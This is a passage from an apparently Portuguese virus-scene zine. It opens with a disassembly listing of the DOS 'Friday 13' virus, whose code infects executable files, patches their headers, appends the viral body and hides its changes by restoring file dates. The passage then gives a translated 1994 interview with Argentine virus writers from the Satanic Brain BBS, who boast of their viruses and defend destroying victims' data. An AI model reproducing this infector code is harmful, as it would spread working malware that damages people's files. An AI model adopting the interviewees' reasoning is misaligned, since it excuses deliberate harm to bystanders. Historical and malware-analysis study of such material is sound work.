+											;  get/set file attrb, nam@ds:dx
+8595:04BD  72 05				JC	LOC_23				; Jump if carry Set
+8595:04BF  2E:89 0E 0072			MOV	CS:DATA_39E,CX			; (8595:0072=0)
+8595:04C4			LOC_23:							;  xref 8595:04BD
+8595:04C4  72 25				JC	LOC_25				; Jump if carry Set
+8595:04C6  32 C0				XOR	AL,AL				; Zero register
+8595:04C8  2E:A2 004E				MOV	CS:DATA_37E,AL			; (8595:004E=0)
+8595:04CC  1E					PUSH	DS
+8595:04CD  07					POP	ES
+8595:04CE  8B FA				MOV	DI,DX
+8595:04D0  B9 0041				MOV	CX,41H
+8595:04D3  F2/AE				REPNE	SCASB				; Rept zf=0+cx>0 Scan es:[di] for al
+8595:04D5  80 7D FE 4D				CMP	BYTE PTR [DI-2],4DH		; 'M'
+8595:04D9  74 0B				JE	LOC_24				; Jump if equal
+8595:04DB  80 7D FE 6D				CMP	BYTE PTR [DI-2],6DH		; 'm'
+8595:04DF  74 05				JE	LOC_24				; Jump if equal
+8595:04E1  2E:FE 06 004E			INC	BYTE PTR CS:DATA_37E		; (8595:004E=0)
+8595:04E6			LOC_24:							;  xref 8595:04D9, 04DF
+8595:04E6  B8 3D00				MOV	AX,3D00H
+8595:04E9  CD 21				INT	21H				; DOS Services  ah=function 3Dh
+											;  open file, al=mode,name@ds:dx
+     FRIDAY13.lst    TA FEIRA 13 (O VIRUS)		 Sourcer Listing v1.70        8-May-93	  6:32 pm       Page 9
+
+8595:04EB			LOC_25:							;  xref 8595:04C4, 04FE
+8595:04EB  72 5A				JC	LOC_27				; Jump if carry Set
+8595:04ED  2E:A3 0070				MOV	CS:DATA_38E,AX			; (8595:0070=0)
+8595:04F1  8B D8				MOV	BX,AX
+8595:04F3  B8 4202				MOV	AX,4202H
+8595:04F6  B9 FFFF				MOV	CX,0FFFFH
+8595:04F9  BA FFFB				MOV	DX,0FFFBH
+8595:04FC  CD 21				INT	21H				; DOS Services  ah=function 42h
+											;  move file ptr, cx,dx=offset
+8595:04FE  72 EB				JC	LOC_25				; Jump if carry Set
+8595:0500  05 0005				ADD	AX,5
+8595:0503  2E:A3 0011				MOV	CS:DATA_23E,AX			; (8595:0011=0)
+8595:0507  B9 0005				MOV	CX,5
+8595:050A  BA 006B				MOV	DX,6BH
+8595:050D  8C C8				MOV	AX,CS
+8595:050F  8E D8				MOV	DS,AX
+8595:0511  8E C0				MOV	ES,AX
+8595:0513  B4 3F				MOV	AH,3FH				; '?'
+8595:0515  CD 21				INT	21H				; DOS Services  ah=function 3Fh
+											;  read file, cx=bytes, to ds:dx
+8595:0517  8B FA				MOV	DI,DX
+8595:0519  BE 0005				MOV	SI,5
+8595:051C  F3/A6				REPE	CMPSB				; Rept zf=1+cx>0 Cmp [si] to es:[di]
+8595:051E  75 07				JNZ	LOC_26				; Jump if not zero
+8595:0520  B4 3E				MOV	AH,3EH				; '>'
+8595:0522  CD 21				INT	21H				; DOS Services  ah=function 3Eh
+											;  close file, bx=file handle
+8595:0524  E9 01C0				JMP	LOC_43
+8595:0527			LOC_26:							;  xref 8595:051E
+8595:0527  B8 3524				MOV	AX,3524H
+8595:052A  CD 21				INT	21H				; DOS Services  ah=function 35h
+											;  get intrpt vector al in es:bx
+8595:052C  89 1E 001B				MOV	DS:DATA_28E,BX			; (8595:001B=0)
+8595:0530  8C 06 001D				MOV	DS:DATA_29E,ES			; (8595:001D=0)
+8595:0534  BA 021B				MOV	DX,21BH
+8595:0537  B8 2524				MOV	AX,2524H
+8595:053A  CD 21				INT	21H				; DOS Services  ah=function 25h
+											;  set intrpt vector al to ds:dx
+8595:053C  C5 16 0080				LDS	DX,DWORD PTR DS:DATA_43E	; (8595:0080=0) Load 32 bit ptr
+8595:0540  33 C9				XOR	CX,CX				; Zero register
+8595:0542  B8 4301				MOV	AX,4301H
+8595:0545  CD 21				INT	21H				; DOS Services  ah=function 43h
+											;  get/set file attrb, nam@ds:dx
+8595:0547			LOC_27:							;  xref 8595:04EB
+8595:0547  72 3B				JC	LOC_28				; Jump if carry Set
+8595:0549  2E:8B 1E 0070			MOV	BX,CS:DATA_38E			; (8595:0070=0)
+8595:054E  B4 3E				MOV	AH,3EH				; '>'
+8595:0550  CD 21				INT	21H				; DOS Services  ah=function 3Eh
+											;  close file, bx=file handle
+8595:0552  2E:C7 06 0070 FFFF			MOV	WORD PTR CS:DATA_38E,0FFFFH	; (8595:0070=0)
+8595:0559  B8 3D02				MOV	AX,3D02H
+8595:055C  CD 21				INT	21H				; DOS Services  ah=function 3Dh
+											;  open file, al=mode,name@ds:dx
+8595:055E  72 24				JC	LOC_28				; Jump if carry Set
+8595:0560  2E:A3 0070				MOV	CS:DATA_38E,AX			; (8595:0070=0)
+8595:0564  8C C8				MOV	AX,CS
+8595:0566  8E D8				MOV	DS,AX
+8595:0568  8E C0				MOV	ES,AX
+     FRIDAY13.lst    TA FEIRA 13 (O VIRUS)		 Sourcer Listing v1.70        8-May-93	  6:32 pm       Page 10
+
+8595:056A  8B 1E 0070				MOV	BX,DS:DATA_38E			; (8595:0070=0)
+8595:056E  B8 5700				MOV	AX,5700H
+8595:0571  CD 21				INT	21H				; DOS Services  ah=function 57h
+											;  get/set file date & time
+8595:0573  89 16 0074				MOV	DS:DATA_40E,DX			; (8595:0074=0)
+8595:0577  89 0E 0076				MOV	DS:DATA_41E,CX			; (8595:0076=0)
+8595:057B  B8 4200				MOV	AX,4200H
+8595:057E  33 C9				XOR	CX,CX				; Zero register
+8595:0580  8B D1				MOV	DX,CX
+8595:0582  CD 21				INT	21H				; DOS Services  ah=function 42h
+											;  move file ptr, cx,dx=offset
+8595:0584			LOC_28:							;  xref 8595:0547, 055E
+8595:0584  72 3D				JC	LOC_31				; Jump if carry Set
+8595:0586  80 3E 004E 00			CMP	BYTE PTR DS:DATA_37E,0		; (8595:004E=0)
+8595:058B  74 03				JE	LOC_29				; Jump if equal
+8595:058D  EB 57				JMP	SHORT LOC_33
+8595:058F  90					DB	90H
+8595:0590			LOC_29:							;  xref 8595:058B
+8595:0590  BB 1000				MOV	BX,1000H
+8595:0593  B4 48				MOV	AH,48H				; 'H'
+8595:0595  CD 21				INT	21H				; DOS Services  ah=function 48h
+											;  allocate memory, bx=bytes/16
+8595:0597  73 0B				JNC	LOC_30				; Jump if carry=0
+8595:0599  B4 3E				MOV	AH,3EH				; '>'
+8595:059B  8B 1E 0070				MOV	BX,DS:DATA_38E			; (8595:0070=0)
+8595:059F  CD 21				INT	21H				; DOS Services  ah=function 3Eh
+											;  close file, bx=file handle
+8595:05A1  E9 0143				JMP	LOC_43
+8595:05A4			LOC_30:							;  xref 8595:0597
+8595:05A4  FF 06 008F				INC	WORD PTR DS:DATA_45E		; (8595:008F=0)
+8595:05A8  8E C0				MOV	ES,AX
+8595:05AA  33 F6				XOR	SI,SI				; Zero register
+8595:05AC  8B FE				MOV	DI,SI
+8595:05AE  B9 0710				MOV	CX,710H
+8595:05B1  F3/A4				REP	MOVSB				; Rep while cx>0 Mov [si] to es:[di]
+8595:05B3  8B D7				MOV	DX,DI
+8595:05B5  8B 0E 0011				MOV	CX,DS:DATA_23E			; (8595:0011=0)
+8595:05B9  8B 1E 0070				MOV	BX,DS:DATA_38E			; (8595:0070=0)
+8595:05BD  06					PUSH	ES
+8595:05BE  1F					POP	DS
+8595:05BF  B4 3F				MOV	AH,3FH				; '?'
+8595:05C1  CD 21				INT	21H				; DOS Services  ah=function 3Fh
+											;  read file, cx=bytes, to ds:dx
+8595:05C3			LOC_31:							;  xref 8595:0584
+8595:05C3  72 1C				JC	LOC_32				; Jump if carry Set
+8595:05C5  03 F9				ADD	DI,CX
+8595:05C7  33 C9				XOR	CX,CX				; Zero register
+8595:05C9  8B D1				MOV	DX,CX
+8595:05CB  B8 4200				MOV	AX,4200H
+8595:05CE  CD 21				INT	21H				; DOS Services  ah=function 42h
+											;  move file ptr, cx,dx=offset
+8595:05D0  BE 0005				MOV	SI,5
+8595:05D3  B9 0005				MOV	CX,5
+8595:05D6  F3 2E A4 8B CF 33			DB	0F3H, 2EH, 0A4H, 8BH, 0CFH, 33H
+8595:05DC  D2 B4 40 CD				DB	0D2H, 0B4H, 40H, 0CDH
+8595:05E0  21					DB	21H
+8595:05E1			LOC_32:							;  xref 8595:05C3
+8595:05E1  72 0D				JC	LOC_34				; Jump if carry Set
+     FRIDAY13.lst    TA FEIRA 13 (O VIRUS)		 Sourcer Listing v1.70        8-May-93	  6:32 pm       Page 11
+
+8595:05E3  E9 00BC				JMP	LOC_41
+8595:05E6			LOC_33:							;  xref 8595:058D
+8595:05E6  B9 001C				MOV	CX,1CH
+8595:05E9  BA 004F				MOV	DX,4FH
+8595:05EC  B4 3F				MOV	AH,3FH				; '?'
+8595:05EE  CD 21				INT	21H				; DOS Services  ah=function 3Fh
+											;  read file, cx=bytes, to ds:dx
+8595:05F0			LOC_34:							;  xref 8595:05E1
+8595:05F0  72 4A				JC	LOC_36				; Jump if carry Set
+8595:05F2  C7 06 0061 1984			MOV	WORD PTR DS:DATA_11E,1984H	; (3E00:0061=4150H)
+8595:05F8  A1 005D				MOV	AX,DS:DATA_9E			; (3E00:005D=0A0CH)
+8595:05FB  A3 0045				MOV	DS:DATA_3E,AX			; (3E00:0045=0DCDCH)
+8595:05FE  A1 005F				MOV	AX,DS:DATA_10E			; (3E00:005F=0A0AH)
+8595:0601  A3 0043				MOV	DS:DATA_2E,AX			; (3E00:0043=0DCDCH)
+8595:0604  A1 0063				MOV	AX,DS:DATA_12E			; (3E00:0063=4547H)
+8595:0607  A3 0047				MOV	DS:DATA_4E,AX			; (3E00:0047=0DCDCH)
+8595:060A  A1 0065				MOV	AX,DS:DATA_13E			; (3E00:0065=2020H)
+8595:060D  A3 0049				MOV	DS:DATA_5E,AX			; (3E00:0049=0DCDCH)
+8595:0610  A1 0053				MOV	AX,DS:DATA_7E			; (3E00:0053=0DCDCH)
+8595:0613  83 3E 0051 00			CMP	WORD PTR DS:DATA_6E,0		; (3E00:0051=0DCDCH)
+8595:0618  74 01				JE	LOC_35				; Jump if equal
+8595:061A  48					DEC	AX
+8595:061B			LOC_35:							;  xref 8595:0618
+8595:061B  F7 26 0078				MUL	WORD PTR DS:DATA_14E		; (3E00:0078=0DBDBH) ax = data * ax
+8595:061F  03 06 0051				ADD	AX,DS:DATA_6E			; (3E00:0051=0DCDCH)
+8595:0623  83 D2 00				ADC	DX,0
+8595:0626  05 000F				ADD	AX,0FH
+8595:0629  83 D2 00				ADC	DX,0
+8595:062C  25 FFF0				AND	AX,0FFF0H
+8595:062F  A3 007C				MOV	DS:DATA_16E,AX			; (3E00:007C=0DBDBH)
+8595:0632  89 16 007E				MOV	DS:DATA_17E,DX			; (3E00:007E=0DBDBH)
+8595:0636  05 0710				ADD	AX,710H
+8595:0639  83 D2 00				ADC	DX,0
+8595:063C			LOC_36:							;  xref 8595:05F0
+8595:063C  72 3A				JC	LOC_38				; Jump if carry Set
+8595:063E  F7 36 0078				DIV	WORD PTR DS:DATA_14E		; (3E00:0078=0DBDBH) ax,dxrem=dx:ax/da
+8595:0642  0B D2				OR	DX,DX				; Zero ?
+8595:0644  74 01				JZ	LOC_37				; Jump if zero
+8595:0646  40					INC	AX
+8595:0647			LOC_37:							;  xref 8595:0644
+8595:0647  A3 0053				MOV	DS:DATA_7E,AX			; (3E00:0053=0DCDCH)
+8595:064A  89 16 0051				MOV	DS:DATA_6E,DX			; (3E00:0051=0DCDCH)
+8595:064E  A1 007C				MOV	AX,DS:DATA_16E			; (3E00:007C=0DBDBH)
+8595:0651  8B 16 007E				MOV	DX,DS:DATA_17E			; (3E00:007E=0DBDBH)
+8595:0655  F7 36 007A				DIV	WORD PTR DS:DATA_15E		; (3E00:007A=0DBDBH) ax,dxrem=dx:ax/da
+8595:0659  2B 06 0057				SUB	AX,DS:DATA_8E			; (3E00:0057=0DCDCH)
+8595:065D  A3 0065				MOV	DS:DATA_13E,AX			; (3E00:0065=2020H)
+8595:0660  C7 06 0063 00C5			MOV	WORD PTR DS:DATA_12E,0C5H	; (3E00:0063=4547H)
+8595:0666  A3 005D				MOV	DS:DATA_9E,AX			; (3E00:005D=0A0CH)
+8595:0669  C7 06 005F 0710			MOV	WORD PTR DS:DATA_10E,710H	; (3E00:005F=0A0AH)
+8595:066F  33 C9				XOR	CX,CX				; Zero register
+8595:0671  8B D1				MOV	DX,CX
+8595:0673  B8 4200				MOV	AX,4200H
+8595:0676  CD 21				INT	21H				; DOS Services  ah=function 42h
+											;  move file ptr, cx,dx=offset
+8595:0678			LOC_38:							;  xref 8595:063C
+8595:0678  72 0A				JC	LOC_39				; Jump if carry Set
+8595:067A  B9 001C				MOV	CX,1CH
+     FRIDAY13.lst    TA FEIRA 13 (O VIRUS)		 Sourcer Listing v1.70        8-May-93	  6:32 pm       Page 12
+
+8595:067D  BA 004F				MOV	DX,4FH
+8595:0680  B4 40				MOV	AH,40H				; '@'
+8595:0682  CD 21				INT	21H				; DOS Services  ah=function 40h
+											;  write file cx=bytes, to ds:dx
+8595:0684			LOC_39:							;  xref 8595:0678
+8595:0684  72 11				JC	LOC_40				; Jump if carry Set
+8595:0686  3B C1				CMP	AX,CX
+8595:0688  75 18				JNE	LOC_41				; Jump if not equal
+8595:068A  8B 16 007C				MOV	DX,DS:DATA_16E			; (3E00:007C=0DBDBH)
+8595:068E  8B 0E 007E				MOV	CX,DS:DATA_17E			; (3E00:007E=0DBDBH)
+8595:0692  B8 4200				MOV	AX,4200H
+8595:0695  CD 21				INT	21H				; DOS Services  ah=function 42h
+											;  move file ptr, cx,dx=offset
+8595:0697			LOC_40:							;  xref 8595:0684
+8595:0697  72 09				JC	LOC_41				; Jump if carry Set
+8595:0699  33 D2				XOR	DX,DX				; Zero register
+8595:069B  B9 0710				MOV	CX,710H
+8595:069E  B4 40				MOV	AH,40H				; '@'
+8595:06A0  CD 21				INT	21H				; DOS Services  ah=function 40h
+											;  write file cx=bytes, to ds:dx
+8595:06A2			LOC_41:							;  xref 8595:05E3, 0688, 0697
+8595:06A2  2E:83 3E 008F 00			CMP	WORD PTR CS:DATA_45E,0		; (8595:008F=0)
+8595:06A8  74 04				JE	LOC_42				; Jump if equal
+8595:06AA  B4 49				MOV	AH,49H				; 'I'
+8595:06AC  CD 21				INT	21H				; DOS Services  ah=function 49h
+											;  release memory block, es=seg
+8595:06AE			LOC_42:							;  xref 8595:06A8
+8595:06AE  2E:83 3E 0070 FF			CMP	WORD PTR CS:DATA_38E,0FFFFH	; (8595:0070=0)
+8595:06B4  74 31				JE	LOC_43				; Jump if equal
+8595:06B6  2E:8B 1E 0070			MOV	BX,CS:DATA_38E			; (8595:0070=0)
+8595:06BB  2E:8B 16 0074			MOV	DX,CS:DATA_40E			; (8595:0074=0)
+8595:06C0  2E:8B 0E 0076			MOV	CX,CS:DATA_41E			; (8595:0076=0)
+8595:06C5  B8 5701				MOV	AX,5701H
+8595:06C8  CD 21				INT	21H				; DOS Services  ah=function 57h
+											;  get/set file date & time
+8595:06CA  B4 3E				MOV	AH,3EH				; '>'
+8595:06CC  CD 21				INT	21H				; DOS Services  ah=function 3Eh
+											;  close file, bx=file handle
+8595:06CE  2E:C5 16 0080			LDS	DX,DWORD PTR CS:DATA_43E	; (8595:0080=0) Load 32 bit ptr
+8595:06D3  2E:8B 0E 0072			MOV	CX,CS:DATA_39E			; (8595:0072=0)
+8595:06D8  B8 4301				MOV	AX,4301H
+8595:06DB  CD 21				INT	21H				; DOS Services  ah=function 43h
+											;  get/set file attrb, nam@ds:dx
+8595:06DD  2E:C5 16 001B			LDS	DX,DWORD PTR CS:DATA_28E	; (8595:001B=0) Load 32 bit ptr
+8595:06E2  B8 2524				MOV	AX,2524H
+8595:06E5  CD 21				INT	21H				; DOS Services  ah=function 25h
+											;  set intrpt vector al to ds:dx
+8595:06E7			LOC_43:							;  xref 8595:046D, 04B5, 0524, 05A1
+											;            06B4
+8595:06E7  07					POP	ES
+8595:06E8  1F					POP	DS
+8595:06E9  5F					POP	DI
+8595:06EA  5E					POP	SI
+8595:06EB  5A					POP	DX
+8595:06EC  59					POP	CX
+8595:06ED  5B					POP	BX
+8595:06EE  58					POP	AX
+8595:06EF  9D					POPF					; Pop flags
+     FRIDAY13.lst    TA FEIRA 13 (O VIRUS)		 Sourcer Listing v1.70        8-May-93	  6:32 pm       Page 13
+
+8595:06F0  2E:FF 2E 0017			JMP	DWORD PTR CS:DATA_26E		; (8595:0017=0)
+8595:06F5  000B[00]				DB	11 DUP (0)
+8595:0700  4D 3C 0C 00 10 00			DB	4DH, 3CH, 0CH, 0, 10H, 0
+8595:0706  00 00 43 4C 49 50			DB	0, 0, 43H, 4CH, 49H, 50H
+8595:070C  50 45 52 00 E9 92			DB	50H, 45H, 52H, 0, 0E9H, 92H
+8595:0712  00 73 55 4D 73 44			DB	0, 73H, 55H, 4DH, 73H, 44H
+8595:0718  6F 73 00 01 9C 0D			DB	6FH, 73H, 0, 1, 9CH, 0DH
+8595:071E  00 00 00 04 00 AA			DB	0, 0, 0, 4, 0, 0AAH
+8595:0724  00 6E 0B 60 14 26			DB	0, 6EH, 0BH, 60H, 14H, 26H
+8595:072A  02 56 05 3C 0C			DB	2, 56H, 5, 3CH, 0CH
+8595:072F  55 66				DB	55H, 66H
+8595:0731  000D[00]				DB	13 DUP (0)
+8595:073E  E8 06 53 1F 0D 80			DB	0E8H, 6, 53H, 1FH, 0DH, 80H
+8595:0744  00 00 00 80 00 1F			DB	0, 0, 0, 80H, 0, 1FH
+8595:074A  0D 5C 00 1F 0D 6C			DB	0DH, 5CH, 0, 1FH, 0DH, 6CH
+8595:0750  00 1F 0D 10 07 EA			DB	0, 1FH, 0DH, 10H, 7, 0EAH
+8595:0756  08 C5 00 EA 08 00			DB	8, 0C5H, 0, 0EAH, 8, 0
+8595:075C  F0 46 00 4D 5A C0			DB	0F0H, 46H, 0, 4DH, 5AH, 0C0H
+8595:0762  00 50 00 04 00 20			DB	0, 50H, 0, 4, 0, 20H
+8595:0768  00 11 00 FF FF 5B			DB	0, 11H, 0, 0FFH, 0FFH, 5BH
+8595:076E  09 10 07 84 19 C5			DB	9, 10H, 7, 84H, 19H, 0C5H
+8595:0774  00 5B 09 1E 00 00			DB	0, 5BH, 9, 1EH, 0, 0
+8595:077A  00 21 42 01 2F 0D			DB	0, 21H, 42H, 1, 2FH, 0DH
+8595:0780  05 00 20 00 21 00			DB	5, 0, 20H, 0, 21H, 0
+8595:0786  E1 00				DB	0E1H, 0
+  
+8595:0788			LOCLOOP_44:
+8595:0788  00 02				ADD	[BP+SI],AL
+8595:078A  10 00				ADC	[BX+SI],AL
+8595:078C  B0 97				MOV	AL,97H
+8595:078E  00 00				ADD	[BX+SI],AL
+8595:0790  B9 EA41				MOV	CX,0EA41H
+8595:0793  98					CBW					; Convrt byte to word
+8595:0794  43					INC	BX
+8595:0795  4F					DEC	DI
+8595:0796  4D					DEC	BP
+8595:0797  4D					DEC	BP
+8595:0798  41					INC	CX
+8595:0799  4E					DEC	SI
+8595:079A  44					INC	SP
+8595:079B  2E					DB	2EH				; CS:
+8595:079C  43					INC	BX
+8595:079D  4F					DEC	DI
+8595:079E  4D					DEC	BP
+8595:079F  01 00				ADD	[BX+SI],AX
+8595:07A1  00 00				ADD	[BX+SI],AL
+8595:07A3  00 00				ADD	[BX+SI],AL
+8595:07A5  FC					CLD					; Clear direction
+8595:07A6  B4 E0				MOV	AH,0E0H
+8595:07A8  CD 21				INT	21H				; DOS Services  ah=function E0h
+8595:07AA  80 FC E0				CMP	AH,0E0H
+8595:07AD  73 16				JAE	LOC_45				; Jump if above or =
+8595:07AF  80 FC 03				CMP	AH,3
+8595:07B2  72 11				JB	LOC_45				; Jump if below
+8595:07B4  B4 DD				MOV	AH,0DDH
+8595:07B6  BF 0100				MOV	DI,100H
+8595:07B9  BE 0710				MOV	SI,710H
+8595:07BC  03 F7				ADD	SI,DI
+     FRIDAY13.lst    TA FEIRA 13 (O VIRUS)		 Sourcer Listing v1.70        8-May-93	  6:32 pm       Page 14
+
+8595:07BE  2E:8B 8D 0011			MOV	CX,CS:[DI+11H]
+8595:07C3  CD 21				INT	21H				; DOS Services  ah=function DDh
+8595:07C5			LOC_45:							;  xref 8595:07AD, 07B2
+8595:07C5  8C C8				MOV	AX,CS
+8595:07C7  05 0010				ADD	AX,10H
+8595:07CA  8E D0				MOV	SS,AX
+8595:07CC  BC 0700				MOV	SP,700H
+8595:07CF  50					PUSH	AX
+8595:07D0  B8 00C5				MOV	AX,0C5H
+8595:07D3  50					PUSH	AX
+8595:07D4  CB					RET					; Return far
+				int_21h_entry	ENDP
+  
+8595:07D5  FC 06 2E 8C 06 31			DB	0FCH, 6, 2EH, 8CH, 6, 31H
+8595:07DB  00 2E 8C 06 39 00			DB	0, 2EH, 8CH, 6, 39H, 0
+8595:07E1  2E 8C 06 3D 00 2E			DB	2EH, 8CH, 6, 3DH, 0, 2EH
+8595:07E7  8C 06 41 00 8C C0			DB	8CH, 6, 41H, 0, 8CH, 0C0H
+8595:07ED  05 10 00 2E 01 06			DB	5, 10H, 0, 2EH, 1, 6
+8595:07F3  49 00 2E 01 06 45			DB	49H, 0, 2EH, 1, 6, 45H
+8595:07F9  00 B4 E0 CD 21 80			DB	0, 0B4H, 0E0H, 0CDH, 21H, 80H
+8595:07FF  FC E0 73 13 80 FC			DB	0FCH, 0E0H, 73H, 13H, 80H, 0FCH
+8595:0805  03 07 2E 8E 16 45			DB	3, 7, 2EH, 8EH, 16H, 45H
+8595:080B  00 2E 8B 26 43 B4			DB	0, 2EH, 8BH, 26H, 43H, 0B4H
+8595:0811  4C CD				DB	4CH, 0CDH
+8595:0813  21 4D 73 44 6F 73			DB	21H, 4DH, 73H, 44H, 6FH, 73H
+  
+				FRIDAY13	ENDP
+  
+				CODESEG		ENDS
+  
+  
+  
+						END	START
+     FRIDAY13.lst    TA FEIRA 13 (O VIRUS)		 Sourcer Listing v1.70        8-May-93	  6:32 pm       Page 15
+
+  
+				▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ CROSS	REFERENCE - EXTERNAL ENTRY POINTS ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+  
+				    seg:off	     name
+				   ---- ----	---------------
+				   0000:0000	int_24h_entry
+				   8595:0100	start
+				   8595:021B	int_24h_entry
+				   8595:021E	int_08h_entry
+				   8595:025B	int_21h_entry
+  
+-------------------------------------------End of File----------------------------------
+
+
+
+
+
+
+
+ !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+=======================================================================================
+     BBS DE VIRUS NA ARGENTINA!! COOL!!   (Agradecimentos no final do zine)
+=======================================================================================
+
+
+
+
+
+
+
+Nota  do tradutor: Esta e uma entrevista feita pela (finada) revista  Virus
+Report  sobre  uma  BBS de virus chamada Satanic Brain,  de  Buenos  Aires, 
+Argentina.  Vale  a  pena  especificar que  os  virus  sao  especificos  da 
+Argentina  e que a entrevista data de 1994. Peco desculpas pelos  erros  de 
+traducao e nao recomendo a ninguem imitar os entrevistados abaixo.
+
+ 
+
+Virus Report: Pode se apresentar
+
+AZ: Azrael, sysop da Satanic Brain. Idade: adolescente. Ocupacao:
+estudante. Nacionalidade: NUKE
+
+MU: Murdok. Nacionalidade: Argentino. 
+
+PA: Patoruzz: Nacionalidade: Argentino. Idade: adolescente. Ocupacao:
+Estudante
+
+MA: Malvinas. Ocupacao: estudante. Nacionalidade: Argentino. Idade: Mais ou
+menos 18.
+
+VR: Digam-me quais virus fizeram cada um de voces.
+
+MU: Eu fiz o Vinchuca e esta para sair o Vinchuca II.
+
+AZ: Fiz o Patoruzu I, o II e ja vai sair o III, que infecta .exe e .com
+
+MA: Fiz o Malvinas e tenho em projeto o Malvinas II.
+
+AZ: Ja vai sair a versao II do Satanic, o criador de virus.
+
+VR: Bueno, todos voces escreveram virus. Comecemos falando da BBS. Como lhe
+ocorreu uma BBS de intercbmbio de virus e porque a colocou em pratica?
+
+AZ: A ideia basica e que a gente que esta interessada no tema possa se dar
+conta que a computacao nao e somente ter um Windows ou um utilitario de
+qualquer tipo, e os que querem programar que se deem conta que existem
+muitas outras linguagens de baixo nivel que ninguem quer utilizar, e que se
+podem fazer coisas com o computador que por meio de virus se pode aprender
+muito mais que aprendendo a programar um banco de dados, pela quantidade de
+coisas que esse programa tem que ser capaz de fazer.
+
+VR: E como te ocorreu de montar uma BBS?
+
+AZ: O BBS comecou ha quatro anos, durou muito pouco, porque tinha muito
+pouca informacao. Se rolou e porque rolou. Um BBS e para manejo de
+informacao. Depois demos informacao sobre virus. No principio tinha muito
+pouca informacao, tinha umas ferramentas que haviamos feito ha tres anos, o
+Intruder, um programa de virus para boot sector, e depois fomos recoletando
+informacao ate poder entrar num grupo de informacao de virus internacional.
+
+VR: E como foi o contato com esse grupo?
+
+AZ: Conseguimos o VCL, feito por Nowhere Man, comecamos chamando BBSes
+estrangeiros, arrumando grana pra fazer as chamadas, depois fazendo contato
+com gente de fora, mandando-lhes virus nossos. E estivemos muito
+interessados em ter uma posto de mensagens da NUKE, que e o grupo ao qual
+pertencemos, na America Latina, nos deram um no, e agora somos todos
+coordenadores para toda latinoamerica de Nuke.
+
+VR: Com respeito ao gerador de virus que fizeste, me tinha dito que fizeste
+ele como publicidade... Porque o fizeste, realmente?
+
+AZ: O gerador de virus o fizemos em uma tarde com os garotos. Se for
+examinar direito, o znico que diz o gerador por todo lado e que chamem o
+BBS. Foi uma forma que nos pareceu bastante tola de publicidade, em vez de
+por avisos nas BBS, como e costume fazer, um gerador de virus baseado no
+VCL, ja que apareceram muitas mensagens na Fidonet, dizendo que era
+possivel qe alguem, manipulando um virus do VCL era capaz de fazer que o
+Scan nao fosse capaz de encontra-lo. Li um par de mensagens dizendo isso e
+li um par de mensagens dizendo que isto era muito dificil de fazer e que
+era necessario ter conhecimentos. Entao, o que fizemos foi por isso ao
+alcance da gente, para que possam criar virus nao destrutivos para
+estudarmos, e fazer propaganda da BBS, porque aparecia o telefone para que
+possam no chamar.
+
+ 
+
+VR: Como e o assunto dos virus destrutivos e nao-destrutivos? Nao sei se
+teus virus sao todos nao destrutivos ou se tambem tem virus destrutivos.
+
+ 
+
+AZ: Os zltimos virus que fizemos sao destrutivos. Quando uma coisa doi a
+alguem, ela da mais importbncia. Se uma pessoa poe um virus na maquina, e
+porque cometeu erros. E tem que aprender a tentar solucionar-los. Ou
+conseguiu software pirata ou conseguiu programas shareware e nao foi
+cuidadoso. Se o virus nao e destrutivo e poe um aviso que o cumprimenta, ou
+que o insulta, esta pessoa vai se esquecer em dois dias. Se perde toda a
+sua informacao nao, ela vai recordar. E calculo que a proxima vez que o
+fizer nao va infectar a maquina.
+
+ 
+
+VR: Entao o que queres fazer e ensinar com os seus virus...
+
+ 
+
+AZ: Eu quero demonstrar as pessoas que estao sendo enganadas, que todos os
+antivirus sao uma mentira, que nada funciona e que ha muitas outras coisas
+que se podem fazer com o computador alem de jogar (videogames).
+
+ 
+
+VR: Mas alem de fazer virus se pode tambem fazer outras coisas.
+
+ 
+
+AZ: Sim, por suposicao, nos fazemos tanto virus quanto programas de outro
+tipo. Ha utilitarios nossos de todo tipo. Temos feito programas de manejo e
+estudo de virus que nao sao destrutivos para nada. Suponhamos que um rapaz
+queira ser tecnico de computacao e vai a um curso secundario, digamos o
+Otto Krause (Escola de 2o grau tecnico de Buenos Aires?) que e o secundario
+que fiz. Nos seis anos a znica coisa que vai ensinar e o Basic e no zltimo
+ano se tenta ensinar o Qpro, algo completamente ridiculo. Sou um
+adolescente e me parece mais divertido fazer um virus do que fazer uma
+planilha de calculo, simplesmente porque me chama mais a atencao, e por
+essa razao e que me dedico a fazer virus. E que sejam destrutivos ou nao,
+isto depende da forma de ser de cada um. Eu prefiro fazer-los destrutivos
+porque calculo que as pessoas vao se recordar mais.
+
+ 
+
+MA: Eu nao quero fazer-los destrutivos. Para mim, nao tem sentido. Eu nao
+penso em destruir as coisas de outras pessoas que trabalham melhor com
+isso. Eu entendo que tem muitas pessoas que merecem que se destruam a
+maquina, mas tem pessoas que ganham a vida com isso e que se destruir a
+informacao isso nao me parece legal e por outro lado, se alguem destroi a
+maquina, por exemplo, limpa o disco, a znica coisa que faz e perder a
+maquina infectada. Com a qual, se o virus se ativa de uma vez e destroi o
+disco, a maioria das pessoas vao investigar muito a fundo ate limpar-lo.
+Entao, a znica coisa que faco, e, desse dia em diante, perder grande parte
+das maquinas infectadas...
+
+ 
+
+VR: Estas perdendo mercado...
+
+ 
+
+MA: Estas perdendo possibilidades de infeccao.
+
+ 
+
+VR: Mas porque te interessa que teus virus estejam em todas as maquinas?
+
+ 
+
+MA: A mim me interessa porque um nao pode expressar coisas porque nao se
+esta na televisao. E tudo que sai da computacao em revistas importantes ou
+no que quer que seja, e muito marketing, muita publicidade, a mim interessa
+mais expressar coisas de forma que muita gente se possa inteirar do que se
+pensa, do que um quer fazer, sem ter que acessar esses meios, e muito
+dificil.
+
+ 
+
+VR: Entao para vos os virus sao um meio de expressao.
+
+ 
+
+MA: Um meio de expressao, sim, de comunicacao.
+
+ 
+
+VR: Alguem quer agregar mais alguma coisa ao tema?
+
+ 
+
+PA: Sim , que como disse Malvinas, fazer virus destrutivos e uma forma de
+destruir-se a si proprio e alem de nao ter graca, porque nao vai se
+espalhar tanto o virus, porque como destrui va chegar a um ponto donde nao
+vai poder se expandir mais e todo o que tiver o virus vai se destruir. Nao
+tem graca destruir todo o disco de uma vez porque depois este virus
+desaparece. 
+
+ 
+
+MU: Da mesma forma, se um virus e bem infeccioso, e tem um tempo grande de
